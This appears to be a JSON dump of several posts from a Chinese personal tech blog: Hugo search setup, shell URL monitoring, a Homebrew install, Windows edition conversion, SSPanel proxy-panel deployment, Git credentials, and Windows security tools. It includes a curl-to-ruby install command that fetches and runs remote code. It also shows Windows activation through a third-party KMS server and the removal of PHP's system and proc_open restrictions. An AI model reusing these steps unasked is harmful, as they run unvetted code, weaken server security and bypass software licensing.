&lt;/div&gt;&lt;/script&gt;&lt;script src=&quot;https://code.jquery.com/jquery-3.3.1.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.0/fuse.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;&#123;&#123; &quot;js/search.js&quot; | absURL &#125;&#125;&quot;&gt;&lt;/script&gt; 和原链相比去掉了以下这样的代码： 1&#123;&#123; define &quot;main&quot; &#125;&#125; … &#123;&#123; end &#125;&#125; 此处的 define 其实更像是 implement，或者说 define 这个 block 内的内容，而前提是你已经定义过这个 block。一般是在 Base Template 里，以下面的格式定义： 1&#123;&#123; block &quot;main&quot; . &#125;&#125; … &#123;&#123; end &#125;&#125; 这个例子是基于 Hugo Resume Theme，它在 layouts/_default/baseof.html 里定义了 block，而我使用的主题没有，结果就是直接使用原链的代码搜索页面会跳白板。 然后，没有 Base Template 可以引用的结果就是搜索界面比较丑，慢慢美化吧。 我就加个简单搜索功能，结果被迫学习了 Hugo 的模板布局架构，嗯，人间正道是沧桑。 第三步：创建 static/js/search.js 这是具体实现搜索功能的 JS 函数，search.html 中被引用，照抄即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105summaryInclude=60;var fuseOptions = &#123; shouldSort: true, includeMatches: true, threshold: 0.0, tokenize:true, location: 0, distance: 100, maxPatternLength: 32, minMatchCharLength: 1, keys: [ &#123;name:&quot;title&quot;,weight:0.8&#125;, &#123;name:&quot;contents&quot;,weight:0.5&#125;, &#123;name:&quot;tags&quot;,weight:0.3&#125;, &#123;name:&quot;categories&quot;,weight:0.3&#125; ]&#125;;var searchQuery = param(&quot;s&quot;);if(searchQuery)&#123; $(&quot;#search-query&quot;).val(searchQuery); executeSearch(searchQuery);&#125;else &#123; $(&#x27;#search-results&#x27;).append(&quot;&lt;p&gt;Please enter a word or phrase above&lt;/p&gt;&quot;);&#125;function executeSearch(searchQuery)&#123; $.getJSON( &quot;/index.json&quot;, function( data ) &#123; var pages = data; var fuse = new Fuse(pages, fuseOptions); var result = fuse.search(searchQuery); console.log(&#123;&quot;matches&quot;:result&#125;); if(result.length &gt; 0)&#123; populateResults(result); &#125;else&#123; $(&#x27;#search-results&#x27;).append(&quot;&lt;p&gt;No matches found&lt;/p&gt;&quot;); &#125; &#125;);&#125;function populateResults(result)&#123; $.each(result,function(key,value)&#123; var contents= value.item.contents; var snippet = &quot;&quot;; var snippetHighlights=[]; var tags =[]; if( fuseOptions.tokenize )&#123; snippetHighlights.push(searchQuery); &#125;else&#123; $.each(value.matches,function(matchKey,mvalue)&#123; if(mvalue.key == &quot;tags&quot; || mvalue.key == &quot;categories&quot; )&#123; snippetHighlights.push(mvalue.value); &#125;else if(mvalue.key == &quot;contents&quot;)&#123; start = mvalue.indices[0][0]-summaryInclude&gt;0?mvalue.indices[0][0]-summaryInclude:0; end = mvalue.indices[0][1]+summaryInclude&lt;contents.length?mvalue.indices[0][1]+summaryInclude:contents.length; snippet += contents.substring(start,end); snippetHighlights.push(mvalue.value.substring(mvalue.indices[0][0],mvalue.indices[0][1]-mvalue.indices[0][0]+1)); &#125; &#125;); &#125; if(snippet.length&lt;1)&#123; snippet += contents.substring(0,summaryInclude*2); &#125; //pull template from hugo templarte definition var templateDefinition = $(&#x27;#search-result-template&#x27;).html(); //replace values var output = render(templateDefinition,&#123;key:key,title:value.item.title,link:value.item.permalink,tags:value.item.tags,categories:value.item.categories,snippet:snippet&#125;); $(&#x27;#search-results&#x27;).append(output); $.each(snippetHighlights,function(snipkey,snipvalue)&#123; $(&quot;#summary-&quot;+key).mark(snipvalue); &#125;); &#125;);&#125;function param(name) &#123; return decodeURIComponent((location.search.split(name + &#x27;=&#x27;)[1] || &#x27;&#x27;).split(&#x27;&amp;&#x27;)[0]).replace(/\\+/g, &#x27; &#x27;);&#125;function render(templateString, data) &#123; var conditionalMatches,conditionalPattern,copy; conditionalPattern = /\\$\\&#123;\\s*isset ([a-zA-Z]*) \\s*\\&#125;(.*)\\$\\&#123;\\s*end\\s*&#125;/g; //since loop below depends on re.lastInxdex, we use a copy to capture any manipulations whilst inside the loop copy = templateString; while ((conditionalMatches = conditionalPattern.exec(templateString)) !== null) &#123; if(data[conditionalMatches[1]])&#123; //valid key, remove conditionals, leave contents. copy = copy.replace(conditionalMatches[0],conditionalMatches[2]); &#125;else&#123; //not valid, remove entire section copy = copy.replace(conditionalMatches[0],&#x27;&#x27;); &#125; &#125; templateString = copy; //now any conditionals removed we can do simple substitution var key, find, re; for (key in data) &#123; find = &#x27;\\\\$\\\\&#123;\\\\s*&#x27; + key + &#x27;\\\\s*\\\\&#125;&#x27;; re = new RegExp(find, &#x27;g&#x27;); templateString = templateString.replace(re, data[key]); &#125; return templateString;&#125; 注：Hugo 的 static/ 目录存放需要应用的图片、CSS、JS 文件，build 时会直接生成于站点根目录。 后记 配置完成发现中文搜索有问题（中文分词问题，不奇怪），之后再慢慢研究吧。 这个例子使用的是 Fuse.js，但按照这个结构替换为其它 JS 库（Lunr.js …）也是可以的 参考链接 为 Hugo 添加搜索功能 Hugo 集成 Algolia 搜索","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"},{"name":"hugo","slug":"hugo","permalink":"https://sobaigu.com/tags/hugo/"}]},{"title":"利用Shell脚本程序监测网站访问是否正常","slug":"test-url-with-curl-wget-by-shell","date":"2020-08-24T05:21:24.000Z","updated":"2020-08-24T05:21:24.000Z","comments":true,"path":"test-url-with-curl-wget-by-shell.html","permalink":"https://sobaigu.com/test-url-with-curl-wget-by-shell.html","excerpt":"","text":"前言 监控网站URL是否正常最常见的方法莫过于 wget 和 curl 命令了，这两个命令都是非常强大的，强大到通过查看帮助都无从选择的地步。 但我们还是要花时间去研究下，研究好了事半功倍。 wget wget命令的参数非常多，至少也有数十个， 但是运维工作中常用的并不多，其中最有用的列表如下： 命令参数 用途说明 wget 下载网页或文件 –spider 模拟爬虫的行为去访问网站，但不会下载网页 -q, --quiet 安静的访问，禁止输出，类似-o /dev/null功能 -o, --output-file=FILE 记录输出到文件 -T, --timeout=SECONDS 访问网站的超时时间 -t, --tries=NUMBER 当网站异常时重试网站的次数 wget监控方法示例 利用wget命令返回值确定网站是否正常 123# wget --spider -T 5 -q -t 2 www.sobaigu.com# echo $? //利用返回值确定网站是否正常。 0 curl curl命令的参数比wget的参数还多，但运维中常用的参数也并不多，因此也是列表如下： 命令参数 用途说明 curl命令 访问网站url -I, --head 显示响应头信息 -m, --max-time 访问超时的时间 -o, --output 记录访问信息到文件 -s, --silent 沉默模式访问，就是不输出信息 -w, --write-out 以固定特殊的格式输出，例如：%{http_code}，输出状态码 curl监控方法示例 利用curl命令返回值确定网站是否正常 1234# curl -s -o /dev/null www.sobaiguu.com# echo $? 0 获取命令执行后的状态码(200表示正常) 123# curl -I -m 5 -s -w &quot;%&#123;http_code&#125;\\n&quot; -o /dev/null www.sobaigu.com 200 一段Shell脚本实现监控指定的URL是否正常 12345678910111213141516171819202122232425262728293031#!/bin/shfunction usage()&#123; //帮助函数 echo $&quot;usage:$0 url&quot; exit 1&#125;function check_url()&#123; //检测URL函数。 wget --spider -q -o /dev/null --tries=1 -T 5 $1 //采用wget返回值方法，这里的$1就是函数传参 //采用curl返回值方法也是可以的 //curl -s -o /dev/null $1 if [ $? -eq 0 ]; then echo &quot;$1 is yes.&quot; exit 0 else echo &quot;$1 is fail.&quot; exit 1 fi&#125;function main()&#123; //主函数。 //如果传入的多个参数，则打印帮助函数，提示用户 if [ $# -ne 1 ]; then usage fi check_url $1 //接收函数的传参，即把结尾的$*传到这里&#125;main $* //这里的$*就是把命令行接收的所有参数作为函数参数传给函数内部，常用手法","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"macOS系统终端命令安装软件方法","slug":"macos-brew-install-software","date":"2020-07-18T09:56:57.000Z","updated":"2020-07-18T09:56:57.000Z","comments":true,"path":"macos-brew-install-software.html","permalink":"https://sobaigu.com/macos-brew-install-software.html","excerpt":"","text":"前言 会给人维护个环境，装个软件之类的，可这年头有钱人多了，明明只会点鼠标左右键，却用的macOS。 Linux操作系统各发行版的软件包管理器，如 Debian 系的 apt ，Redhat 系的 yum 及 Arch 的 pacman 等，这些咱都在学校学过，可奈何咱没接触高端macOS的机会，只能网上摘些知识在虚拟机里练练，期待下次给土豪远程的时候全程在终端内完成，显得高端大气上档次一点，指不定还能博得土豪欢心打赏个红包。 无缘高端的macOS MacOS系统俺知道可在 Appstore 中获取安装软件，或者从网上下载 pkg、dmg 格式的安装包双击或拖到 程序 文件夹安装运行。 但强大的包管理软件 Homebrew 以及其扩展 Homebrew-Cask 不是内置软件，一直不知道macOS的终端在线安装程序命令，也就一直没去研究安装其本身及这个所谓强大的工具用法。 macOS上终端安装命令 迫于生活所迫，终究还是面对了这个问题，所以我求助了下战略合作伙伴，依然没人提及这个小白迷惑，说的都是安装 Homebrew ，然后再 brew install a b c 难道没有内置的安装命令嘛？有篇文章说 sudo installer -pkg &lt;package&gt; -target / ，难道就是 installer 这个简单粗暴吗？如果有能解答此惑的还请给指点迷津，感激不尽。 安装Homebrew &amp; Homebrew-Cask 网上抄的，执行一个ruby脚本完成安装。 1/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot; Homebrew-cask 相当于 Homebrew 的扩展，区别在于 brew 命令首先获取程序源码然后编译安装（包括依赖库），并自动做好必要的配置（如环境变量等），而 brew cask 命令是下载已经编译好的应用包并放在统一的目录中。 安装好 Homebrew 后，可使用 brew tap caskroom/cask 命令直接安装 Homebrew-cask 。 常用命令选项 install ：安装软件 uninstall ：卸载软件 update ：使用 git 获取最新版本的 Homebrew list ：列出所有已通过 brew 命令安装的软件 search &lt;text|/text/&gt; ：通过关键字 text 搜索可供安装的软件，如搜索关键字为 /text/ ，则表示由 text 组成的正则表达式 info ：获取软件包的简要信息 更多用法可参考：man brew 参考文档 MacOS 系统使用命令安装软件包","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"Windows零售版转换成vol批量可激活版","slug":"windows-version-change-to-vol","date":"2020-07-08T07:48:19.000Z","updated":"2020-07-08T07:48:19.000Z","comments":true,"path":"windows-version-change-to-vol.html","permalink":"https://sobaigu.com/windows-version-change-to-vol.html","excerpt":"","text":"前言 如果没有购买正版Windows，或者不想用电脑厂商出厂带的OEM版「一般是家庭版，有些功能没有」，重装后我们一般会找个KMS激活，但如果装的时候没选好版本，可能用KMS工具激活的时候会提示该系统非vl版，激活失败之类的。 解决 如果装的系统不是 VL 版本，此时你也许会重新下载个 VL 版重装，这当然是可以的。 另外一方面，我们也不需要这么麻烦，因为系统镜像本身就大同小异，只是里面一两个配置不一样而已，我们只需要 用 DISM 命令将已经装好的系统更改为 VOL 版本，当然也可以用这个命令从 Home 升级为 Professional 。 确认已安装的版本 在CMD或者Powershell中，用下面的命令可以知道自己当前已经安装的是什么版本： 1DISM /online /Get-CurrentEdition 运行结果是这样： 123456789101112131415Windows PowerShellCopyright (C) 2012 Microsoft Corporation. All rights reserved.PS C:\\Users\\Administrator&gt; DISM /online /Get-CurrentEditionDeployment Image Servicing and Management toolVersion: 6.2.9200.22807Image Version: 6.2.9200.22807Current edition is:Current Edition : ServerStandardThe operation completed successfully. 以及可以升级到什么版本 1DISM /online /Get-TargetEditions 准备秘钥 密钥可以网上搜索，找个自己已安装版本对应的密钥，可以到微软官网 Appendix A: KMS Client Setup Keys 去找个，因为反正目的都是为了KMS激活。 以自己vps里装的一个为例，通过上面的命令可知版本是 Windows Server 2012 Server Standard ，那么从上面的官网上可以找到可用密钥为：XC9B7-NBPP2-83J2H-RHMBY-92BT4 转换成VL版 转换命令： 1DISM /online /Set-Edition:&lt;edition ID&gt; /ProductKey:XXXXX-XXXXX-XXXXX-XXXXX-XXXXX /AcceptEula Edition ID 就是前文得到的那个版本 ServerStandard，ProductKey 后面把序列号填上去就行，这个方法可以解决 slmgr /ipk 命令无法安装 VL 密钥的情况，也适用于 Standard 转 DataCenter 按实际情况组合完为： 1DISM /online /Set-Edition:ServerStandard /ProductKey:XC9B7-NBPP2-83J2H-RHMBY-92BT4 /AcceptEula 命令执行完会要求重启，按要求重启系统。 系统激活 转换为 VL 版后，再去激活系统就简单多了，市面上几乎所有的工具都能一键激活，KMS工具激活就不提了，都在界面上，自行点点就激活完成了，不想用工具的可以用以下命令： 1234#设置kms服务器slmgr /skms kms.03k.org#自动激活slmgr /ato 参考文档 Windows Server 2012从Evaluation版转成正式版 KMS服务~一句命令激活windows/office","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"簡單的 `index.html` 實現網頁網址跳轉","slug":"forward-link-with-location-in-index","date":"2020-05-25T02:02:22.000Z","updated":"2020-05-25T02:02:22.000Z","comments":true,"path":"forward-link-with-location-in-index.html","permalink":"https://sobaigu.com/forward-link-with-location-in-index.html","excerpt":"","text":"一段簡單的代碼，可以實現訪問 a.com 跳轉到 b.com 的目的，而且只需要一個 index.html ，網上免費的服務器託管就能滿足需求： 123&lt;script language=&quot;javascript&quot;&gt; document.location.href = &quot;http://example.com:8080/&quot;;&lt;/script&gt; 只需要在訪問的web服務器上創建個 index.html ，寫入如上代碼就可以實現任意的跳轉，還可以指定端口。針對一些引流應用，有人將這麼斷簡單的代碼功能賣好幾十一個月。","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"解决开源版ssrpanel新部署时各种报错","slug":"issues-with-ssrpanel-mit-version","date":"2020-05-22T15:24:30.000Z","updated":"2020-05-22T15:24:30.000Z","comments":true,"path":"issues-with-ssrpanel-mit-version.html","permalink":"https://sobaigu.com/issues-with-ssrpanel-mit-version.html","excerpt":"","text":"前言 公元2020年5月22日，因为开会的原因，新搭个面板备用。由于手上这个版本原开发者已经不维护了，其新版本自己也一直不适应，就又折腾了一遍，其中安装的时候有各种报错，各种模块缺少，支付宝在线扫码支付也报 system error ，好在经过一番折腾也搞定了，又能愉快地玩耍了。 其他错误请见本站历次其他记录，本文就新问题新记录，基本上都是赶不上依赖包更新或本程序烂尾留下的问题。 错误1 Class 'Tymon\\JWTAuth\\Providers\\LaravelServiceProvider' not found 完整错误提示： Class ‘Tymon\\JWTAuth\\Providers\\LaravelServiceProvider’ not found {“exception”:&quot;[object] (Symfony\\Component\\Debug\\Exception\\FatalThrowableError(code: 0): Class ‘Tymon\\JWTAuth\\Providers\\LaravelServiceProvider’ not found at /www/wwwroot/demo/vendor/laravel/framework/src/Illuminate/Foundation/ProviderRepository.php:208) 胖虎在该工程即将烂尾的时候，引入了新的认证，但最终未完工，虽然打了 release tag ，但真的算烂尾工程，依赖包安装引用未添加，为解决该问题，需要在 composer.json 中添加如下包： 123&quot;require&quot;: &#123; &quot;tymon/jwt-auth&quot;: &quot;1.0.*&quot;&#125; 错误2 Class 'Telegram\\Bot\\Laravel\\TelegramServiceProvider' not found 完整错误提示： Class ‘Telegram\\Bot\\Laravel\\TelegramServiceProvider’ not found {“exception”:&quot;[object] (Symfony\\Component\\Debug\\Exception\\FatalThrowableError(code: 0): Class ‘Telegram\\Bot\\Laravel\\TelegramServiceProvider’ not found at /www/wwwroot/demo.sobaigu.com/vendor/laravel/framework/src/Illuminate/Foundation/ProviderRepository.php:208) 和上面的一样，添加了新代码却没打扫基础环境，在 composer.json 中添加如下包： 123&quot;require&quot;: &#123; &quot;irazasyed/telegram-bot-sdk&quot;: &quot;^2.0&quot;&#125; 错误3 支付宝在线支付提示 system error 完整错误提示： Class ‘Payment\\Client\\Charge’ not found {“userId”:2,“exception”:&quot;[object] (Symfony\\Component\\Debug\\Exception\\FatalThrowableError(code: 0): Class ‘Payment\\Client\\Charge’ not found at /www/wwwroot/demo/app/Http/Controllers/PaymentController.php:174) 这个错误倒不是烂尾，是因为太久没人维护了，而原项目中 composer.lock 时而有时而删除，最后一个版本恰好删除了，然后该 Payment 项目又升级了，升级后不支持老版的支付接口，所以问题就出现了。 知道原因，那我们只需固定可用的版本即可，同样在 composer.json 中修改： 123&quot;require&quot;: &#123; &quot;riverslei/payment&quot;: &quot;4.1.7&quot; //固定4.1.7版，升5.1.0就不能用&#125; 历次的问题 解决“Peer fingerprint did not match”错误提示 laravel执行 php artisan key:generateerror 及mailgun发信抛异常 解决SSRPanel面板用户登录报错 SSRpanel搭建相关设置问题","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"解决“Peer fingerprint did not match”错误提示","slug":"php-error-peer-fingerprint-did-not-match","date":"2020-05-20T13:33:59.000Z","updated":"2020-05-20T13:33:59.000Z","comments":true,"path":"php-error-peer-fingerprint-did-not-match.html","permalink":"https://sobaigu.com/php-error-peer-fingerprint-did-not-match.html","excerpt":"","text":"前言 有个PHP网站跑的好好的，闲来无事把宝塔面板里的软件升级了一把，系统里也update了一回。然后，发现网站功能不正常了，定时任务执行完成没有效果，线上生产环境，思来想去不知道哪里出错了，慌得一逼，还好最后解决得有惊无险！ 现象 用系统定时任务设置了个PHP任务，但任务结果迟迟不对，但 tail -f /var/log/cron 可见系统任务正常执行。 排查 因为是线上环境，不敢冒然动手，只能一点点试探。因为升级过环境，所以也不可能把所有软件都想一遍，既然是PHP任务，那第一个想到的就是PHP程序出问题了。 检查下来PHP程序功能也没什么问题，除了定时任务执行结果不对，索性手动运行了一把： 12# 先切到网站目录，然后执行php artisan schedule:run 结果显示： 1[Composer\\Downloader\\TransportException] Peer fingerprint did not match 这个错误Google一把，人家说是版本不匹配，再去看看自己安装的PHP版本，7.2.31 并没有错，但系统内用 php -v 却是 5.6.4 ，版本不符，这个版本并没有安装过，也不知道怎么来的，不知道是删库塔更新错误还是 yum update 的时候哪里带来的，总归知道原因了。 解决 宝塔面板处理 在宝塔面板上可以直接切换PHP命令行版本的功能：宝塔面板》网站》PHP命令行版本 ，点击选择你要的版本即可。 系统内处理 如果没有删库塔上这个功能入口，也可以登录系统自行更改： 12#找到PHP程序位置whereis php 会返回PHP路径，一般都在 /usr/bin/php ，然后把这个入口链接到你安装的PHP实际路径即可，如删库塔安装的PHP位置为：/www/server/php/72/bin/php ，那么，执行以下命令： 1ln -sf /www/server/php/72/bin/php /usr/bin/php 软链接创建完成后，再次 php -v 检查版本应该就正确了，此时PHP任务执行功能正常，故障得以消除。","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"},{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"Git本地客户端账号密码的增删改操作","slug":"git-set-credential-store-edit-delete","date":"2020-05-11T15:44:18.000Z","updated":"2020-05-11T15:44:18.000Z","comments":true,"path":"git-set-credential-store-edit-delete.html","permalink":"https://sobaigu.com/git-set-credential-store-edit-delete.html","excerpt":"","text":"前言 本来Git本地客户端习惯用密钥认证，偶尔用下账号密码，第一次输错了后，Git不再提示输入账号密码了，也就直接用的错误账号密码最终报错，找改的地方也要找半天。 有时候每次 pull、push 项目的时候都要输入 username 和 password 也不胜其烦，所以会希望能简化这个输入过程。 以下操作以 Windows10 为例，其他操作系统大同小异，请自行变通。 保存 username 和 password 首先我们找到用户目录如 C:\\Users\\用户 下的 .gitconfig 打开它（window10 下的 .gitconfig 文件位置和 win7 不一样），并在后面加上下面这段文本： 12[credential] helper = store 也可以用以下命令一步完成配置： 1git config --global credential.helper store 保存后的第一次操作还是需要输入 uesrname 和 password ，操作成功后会在 .gitconfig 的同目录下产生一个 .git-credentials 文件，你的用户名和密码都会保存在里面；这之后的 git 的操作就不再需要输入 username 和 password 了。 删除/编辑已记住的 username 和 password 倘若你在第一次操作时，是按上面的方法设置好了保存输出到 .git-credentials ，此时输错了密码，只需要将这个文件清空或者删除，然后重新运行git命令即会重新提示你输入账号密码。 如果你之前没做以上设置，那么默认是不会将账号密码输出的，Git官方文档说保存在内存缓存中，持续15分钟，实际上测试也不知道多久，错了就一直错了，不再弹出账号密码输入步骤，不知道是不是哪里有岔。 在这种情况下，在Windows系统中，我们可以通过 Windows控制面板 来实现，步骤如下： 打开控制面板（Control Panel） 找到用户账户（User Accounts） 选择管理 Windows 凭据（Manage Windows Credentials） 在下面找到如 git：https://github.com 之类的凭证，打开编辑保存即可","categories":[{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"},{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"},{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"SSPanel-uim部署记录","slug":"ss-panel-deploy-notes","date":"2020-04-15T13:21:23.000Z","updated":"2020-04-15T13:21:23.000Z","comments":true,"path":"ss-panel-deploy-notes.html","permalink":"https://sobaigu.com/ss-panel-deploy-notes.html","excerpt":"","text":"前言 ssrpanel开源版已经不维护了，新版vnetpanel一直都不适应，索性重新琢磨下最开始的sspanel，做个基础笔记，方便自己折腾的时候复制粘贴用。 实施步骤 总体来说也没啥复杂的过程，将要输的命令放一个 sh 脚本里执行就可以了，遇到什么问题根据错误提示解决什么问题即可。 安装基础环境 sspanel依赖PHP+MySQL环境，还需要个nginx负责前端，一般安装LNMP即可。安装环境过程不表，最简单的一键脚本或者宝塔大法等安装即可，都是一键的，傻白甜推荐直接宝塔大法。 PHP版本建议是7.2+，删除 system、proc_open、proc_get_status、putenv 等禁用函数。 安装完了环境便可建立一个网站，设置好网站目录，数据库等信息。 克隆仓库文件 sspanel众多版本，目前最活跃的当属 Anankke 负责维护的 SSPanel-Uim，如果需要稳定，建议用 master 分支，dev 分支指不定有什么坑。 123456# 切换到网站目录,以宝塔大法为例，以sspanel这个网站目录为例cd /www/wwwroot/sspanel# 把master分支仓库克隆到当前目录下的tmp目录下git clone -b master https://github.com/Anankke/SSPanel-Uim.git tmp # 将仓库移到当前目录并硬恢复仓库文件mv tmp/.git . &amp;&amp; rm -rf tmp &amp;&amp; git reset --hard 部署安装 程序准备就绪就可以进入安装阶段了，以下步骤执行完会安装一大坨依赖。 12345cd /www/wwwroot/sspanelwget https://getcomposer.org/installer -O composer.pharphp composer.pharphp composer.phar installchown -R www.www ../sspanel 如果某依赖库路径不存在，在执行 php composer.phar install 安装命令时会报错，如： Your requirements could not be resolved to an installable set of packages. Problem 1 - The requested package charlottedunois/yasmin could not be found in any version, there may be a typo in the package name. 此时网络上查找下，修正为正确的包路径，此处将 composer.json 中的 charlottedunois/yasmin 修改为 laravel-discord/yasmin ，然后再执行以上安装命令即可。 至此，程序安装工作就完成了。 初始化 新建网站时需要初始化数据库和配置等，一般修改完成后后期就很少变动了。 导入数据库文件 以下方法任选其一，傻白甜强烈建议宝塔大法。 宝塔大法界面上导入： 12创建个链接到宝塔数据库备份目录ln -s /www/wwwroot/sspanel/sql/glzjin_all.sql /www/backup/database/ 以上链接创建完，宝塔面板上数据库菜单点进去，点 导入 ，然后选择该数据即可。或者打开 phpmyAdmin 面板去导入即可，都是可视化的界面。 命令行方式导入： 123456cd /www/wwwroot/sspanel/mysql -u 用户 -p#输入数据库的密码，注意：这里输入密码是看不到的，直接回车就行use 你创建的数据库;source sql/glzjin_all.sql;exit; 创建管理员 12345678910cd /www/wwwroot/sspanel/# 创建管理员账号php xcat createAdmin# 同步管理员账号php xcat syncusers# 纯真 IP 数据库php xcat initQQWryphp xcat resetTraffic# 初始化客户端工具下载php xcat initdownload 修改配置 123cd /www/wwwroot/sspanel/cp config/.config.example.php config/.config.phpvim config/.config.php 打开 .config.php 可见每行配置的注释，根据实际情况填写即可。注释都是汉字的，相信也没什么好解释的。 设置定时任务 使用 crontab -e -u www 命令编辑系统定时任务，有些任务是根据自身需求的，自行斟酌。 这几条都是必须的： 123430 22 * * * php /www/wwwroot/sspanel/xcat sendDiaryMail0 0 * * * php -n /www/wwwroot/sspanel/xcat dailyjob*/1 * * * * php /www/wwwroot/sspanel/xcat checkjob*/1 * * * * php /www/wwwroot/sspanel/xcat syncnode 以下是可选的： 123456789101112#每 20 分钟备份 1 次*/20 * * * * php -n /www/wwwroot/网站目录/xcat backup#发送财务报表5 0 * * * php /www/wwwroot/网站目录/xcat sendFinanceMail_day6 0 * * 0 php /www/wwwroot/网站目录/xcat sendFinanceMail_week7 0 1 * * php /www/wwwroot/网站目录/xcat sendFinanceMail_month#检测是否被墙*/1 * * * * php /www/wwwroot/网站目录/xcat detectGFW#如果要用到 radius添加以下任务*/1 * * * * php /www/wwwroot/网站目录/xcat synclogin*/1 * * * * php /www/wwwroot/网站目录/xcat syncvpn*/1 * * * * php -n /www/wwwroot/网站目录/xcat syncnas 系统定时任务规则可自行查看帮助，或者网络搜索解决。 如何升级 升级时前面的一些动作就不用做了，需要做的就是拉取最新的程序文件，并xcat更新下即可。 12345cd /www/wwwroot/sspanelgit fetch --all#下面这个步骤默认会丢失除 .config.php 文件以外的所有改动，因此请自行做好文件备份。git reset --hard origin/mastergit pull 拉取最新的文件后，然后在网站目录下，执行下述命令升级 config ： 12cd /www/wwwroot/sspanelphp xcat update 上述命令会在 迁移/更新 操作之前自动备份原 config 文件到 .config.php.bak，迁移/更新操作完成之后会为你输出新旧配置之间的差异","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"Windows下几个很酷的安全维护工具","slug":"software-security-tools","date":"2020-03-07T12:33:27.000Z","updated":"2020-03-07T12:33:27.000Z","comments":true,"path":"software-security-tools.html","permalink":"https://sobaigu.com/software-security-tools.html","excerpt":"","text":"前言 基于以前工作性质，见识了大神的一些奇淫巧技，也知道一些利器，时常也有人问起，刚好整理一下。本质上来说，工具软件是无害的，取决于人如何使用。 懒得码字，一些软件介绍摘自网络。 PeDoll PeDoll 主要面向逆向分析初学者或者是具有一定编程逆向基础的Cracker，旨在简化逆向分析工作，可以在一定程度上对一些具有反逆向功能的恶意程序(加壳，加花，反调试器)简化分析难度或实现自动化分析。 PCHunter PCHunter是一款功能强大的Windows系统信息查看软件，同时也是一款强大的手工杀毒软件。用它不但可以查看各类系统信息，也可以揪出电脑中的潜伏的病毒木马。PCHunter是一款驱动级高权限工具软件，可以对进程、线程、进程模块、进程窗口、进程内存信息查看，杀进程、杀线程、卸载模块等功能，正因如此，黑客也有可能使用这个工具，先把本地保护机制破坏掉，然后就可以肆无忌惮的对计算机进行各种操作。 Process Explorer Process Explorer 是一款由 Sysinternals 公司开发的一款系统软件，可以列出了PC上每个正在运行的应用程序，以及有关正在运行的进程和打开的文件的信息。在Process Explorer中，列表以树形结构显示，所有内容均显示在两个面板的窗口中。上面的面板列出了当前的应用程序，而下面的面板使您可以访问有关所选过程的详细信息。您可以选择停止单个应用程序，更改当前正在运行的进程的优先级以及查看每个进程的属性。这些属性显示每个进程占用了多少内存和空间。您还可以使用Process Explorer查找有关系统的特定信息。其中包括系统当前运行状况的摘要，以及CPU，内存，输入和输出的统计信息和图表。 Process Monitor Process Monitor 也是一款由 Sysinternals 公司开发的包含强大的监视和过滤功能的高级 Windows 监视工具，可实时显示文件系统、注册表、进程/线程的活动。可以捕获进程的详细信息，包括映像路径、命令行、用户和会话 ID等功能非常强大。它结合了两个 Sysinternals 的旧版工具 Filemon 和 Regmon 的功能，并添加了一个包含丰富的和非破坏性的广泛增强过滤功能列表，全面的事件属性（例如会话 ID 和用户名称），可靠的进程信息，每个操作的完整线程、堆栈与集成符号支持，同时记录到一个文件中，以及更多。其独一无二的强大功能将使 Process Monitor 在您的系统故障排除和恶意软件检测中发挥重要的作用。Process Monitor 可以说是安全人员必备工具之一，在对恶意软件分析中担任着很重要的角色。 ProcessHacker Process Hacker 功能和PCHunter 